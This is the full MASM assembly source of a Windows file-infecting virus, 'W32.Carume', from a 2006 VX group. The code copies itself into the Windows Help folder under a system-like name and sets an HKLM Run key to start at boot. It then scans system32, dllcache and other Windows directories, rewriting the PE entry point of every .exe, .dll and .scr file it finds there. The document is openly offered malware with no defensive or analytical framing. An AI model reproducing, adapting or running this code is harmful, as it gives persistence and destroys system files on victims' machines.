;
; W32.Carume
;
; Written by RadiatioN @ XERO VX and hacking group in February-March 2006
;
; THIS FILE HAS NO COPYRIGHTS! I AM NOT RESPONSIBLE FOR ANY DAMAGE WITH THAT CODE!
; 
; Compile with masm 8.2
;
; greetings to vBx and SkyOut
;
; What does this Code?
;  - Copy itself to %WINDIR%\Help\WinHelpCenter.exe
;  - Adds a new registry entry for autostarting itself
;  - Searches in
;     %WINDIR%\ServicePackFiles\i386\
;     %WINDIR%\
;     %WINDIR%\system32\
;     %WINDIR%\system32\dllcache\
;    for file extension files like
;     .exe
;     .dll
;     .scr
;    to infect it
;  - infecting file by changing the RVA entry point of the file
;

.386
.model flat,stdcall
option casemap:none

   include windows.inc
   include user32.inc
   include kernel32.inc
   include advapi32.inc
   
   includelib user32.lib
   includelib kernel32.lib
   includelib advapi32.lib

.data
	; Directories to infect
	szDirectory				db 		"\ServicePackFiles\i386\", 0, "\", 0, "\system32\", 0, "\system32\dllcache\", 0
	dwDirPos				dword	0
	dwDirCount				dword	0
	
	;virus name
	szVirName				db		"W32.Carume",0
	
	; file extensions to find
	szFileExtension			db		".exe", 0, ".dll", 0, ".scr", 0
	dwFileExPos				dword	0
	dwFileExCount			dword	0
	
	; Rest of variables
	szWinDir				db		260 dup(0)
	szDirDest				db		260 dup(0)
	szWildcard				db		'*',0
	szNewDir				db		"\Help\WinHelpCenter.exe",0
	szKey					db		"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
	szValueName				db		"WinHelpCenter",0
	
	hSearch					dword	0
	dwRetVal				dword	0
	check					dword	0
	dwDamnStuff				dword	0
	dwStartOfPE				dword	0
	dwEntryPoint			dword	0
	dwCount					dword	0
	hKey					dword	0
	
	; WIN32_FIND_DATA structure
    dwFileAttributes		dword	0 
        ;FILETIME structure
        ftCreationTime 		dword	0
    	ftCreationTime2		dword	0 
    	;FILETIME structure
        ftLastAccessTime 	dword	0
    	ftLastAccessTime2	dword	0    
    	;FILETIME structure 
        ftLastWriteTime 	dword	0
    	ftLastWriteTime2	dword	0
    nFileSizeHigh			dword	0 
    nFileSizeLow 			dword	0
    dwReserved0 			dword	0
    dwReserved1 			dword	0
    cFileName				db		260	dup(0) 
    cAlternateFileName		db		14 	dup(0)
    
.code
start:
	;Copy File to %WINDIR%\Help\WinHelpCenter.exe
	invoke GetWindowsDirectory, offset szWinDir, 260
	
	push offset szDirDest
	push offset szNewDir
	push offset szWinDir
	call StrCatDest
	
	invoke GetCommandLine
	
	push eax
	call RemoveFirstLast
		
	invoke CopyFile, eax, offset szDirDest, TRUE
	
	invoke RegCreateKey, HKEY_LOCAL_MACHINE, offset szKey, offset hKey
	
	invoke lstrlen, offset szDirDest
	
	invoke RegSetValueEx, hKey, offset szValueName, 0, REG_SZ, offset szDirDest, eax
	
NextDir:
	;go through directorys and infect the files
	push offset dwDirPos
	push offset szDirectory
	call GetNextString
	inc dwDirCount
	mov esi, eax
	
	push offset szDirDest
	push esi
	push offset szWinDir
	call StrCatDest
	
	push offset szDirDest
	push offset szWildcard
	push offset szDirDest
	call StrCatDest
	
	invoke FindFirstFile, offset szDirDest, offset dwFileAttributes
	mov hSearch, eax
		
nextfile:		
	push offset dwFileExPos
	push offset szFileExtension
	call GetNextString
	inc dwFileExCount
	
	push eax 
	push offset cFileName
	call InStr2
	cmp eax, 1
	je Infect
	
	cmp dwFileExCount, 3
	jne nextfile
	
	jmp NoInfection

Infect:
	push offset szDirDest
	push esi
	push offset szWinDir
	call StrCatDest

	push offset cFileName
	push offset szDirDest
	call StrCat
	
	;File infection methods
	;GENERIC_READ | GENERIC_WRITE
	mov eax, 0C0000000h

	;open file
	invoke CreateFile, addr szDirDest, eax, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
	mov dwRetVal, eax
	
	;read start of PE header and add value for entry point offset
	invoke SetFilePointer, dwRetVal, 03Ch, NULL, FILE_BEGIN		
	invoke ReadFile, dwRetVal, offset dwStartOfPE, 4, offset dwDamnStuff, NULL		
	add dwStartOfPE, 028h
	
	;read entry point and a value
	invoke SetFilePointer, dwRetVal, dwStartOfPE, NULL, FILE_BEGIN
	invoke ReadFile, dwRetVal, offset dwEntryPoint, 4, offset dwDamnStuff, NULL
	add dwEntryPoint, 210h
	
	;write new entry point
	invoke SetFilePointer, dwRetVal, -4, NULL, FILE_CURRENT		
	invoke WriteFile, dwRetVal, offset dwEntryPoint, 4, offset dwDamnStuff, NULL
	invoke CloseHandle, dwRetVal	
	
NoInfection:
	mov dwFileExPos, 0	
	mov dwFileExCount, 0
	invoke FindNextFile, hSearch, offset dwFileAttributes
	cmp eax, 0
	jnz nextfile
	
	cmp dwDirCount, 4
	jne NextDir
		
	invoke ExitProcess, 0  
	
;nearly equal to the C-function InStr()
InStr2:
	pop ebp
	pop ecx
	pop check
	mov edx, check
	
InStrLoop:
	mov al, [ecx]
	mov bl, [edx]

	cmp al, bl
	jne InStrRestore
	inc edx
	mov bl, [edx]
	cmp bl, 0
	je InStrTrue	
		
	jmp InStrResume
	
InStrRestore:
	mov edx, check

InStrResume:	
	cmp al,0
	je InStrFalse
	
	cmp bl,0
	je InStrFalse
	
	inc ecx
	jmp InStrLoop
	
InStrFalse:	
	mov eax, 0
	push ebp
	ret	
		
InStrTrue:
	mov eax, 1
	push ebp
	ret
	
;nearly equal to the c-function StrCat()
StrCat:
	pop ebp
	pop ecx
	pop edx
	
StrCatLoop:
	mov al, [ecx]
	
	inc ecx
	
	cmp al, 0
	jne StrCatLoop
	dec ecx
	
StrCatLoop2:		
	mov bl, [edx]
	mov [ecx], bl 
	
	inc ecx
	inc edx
	
	cmp bl,0
	jne StrCatLoop2
	
	push ebp
	ret
	
;modified function of StrCat copys destination string in the 3. argument
StrCatDest:
	pop ebp
	pop	ebx
	pop ecx
	pop edx
	
StrCatDestLoop:
	mov al, [ebx]
	mov [edx], al
	
	inc ebx
	inc edx
	
	cmp al, 0
	jne StrCatDestLoop
	dec	ebx
	dec edx
	
StrCatDestLoop2:
	mov bl, [ecx]
	mov [edx], bl 
	
	inc ecx
	inc edx
	
	cmp bl,0
	jne StrCatDestLoop2
	
	push ebp
	ret
	
;equal to the c-function strcpy()
StrCpy:
	pop ebp
	pop ebx
	pop ecx

StrCpyLoop:
	mov al, [ebx]
	mov [ecx], al
	
	inc ecx
	inc ebx
	
	cmp al, 0
	jne StrCpyLoop	
	
	push ebp
	ret
	
;gets the next string in an array
GetNextString:
    pop ebp
    pop ebx
    pop ecx

    add ebx, [ecx]
        
    mov al, [ecx]
    cmp al, 0
    jnz GetNextStringLoop
    
    inc BYTE PTR [ecx]
    mov eax, ebx
    push ebp
    ret
    
GetNextStringLoop:
    mov al, [ebx]
    
    inc ebx
    inc BYTE PTR [ecx]
    
    cmp al, 0    
    jnz GetNextStringLoop

    push ebp
    mov eax, ebx
    ret

;removes the first and the last character of a string
RemoveFirstLast:
	pop ebp
	pop ebx
	
	inc ebx

RemoveFirstLastLoop:

	mov dl, [ebx]
	
	dec ebx
	
	mov [ebx], dl
	
	inc ebx
	inc ebx
	
	cmp dl,0
	jnz RemoveFirstLastLoop
	
	dec ebx
	dec ebx
	dec ebx
	dec ebx
	
	xor dl, dl
	
	mov [ebx], dl	
	
	push ebp
	ret
		
end start
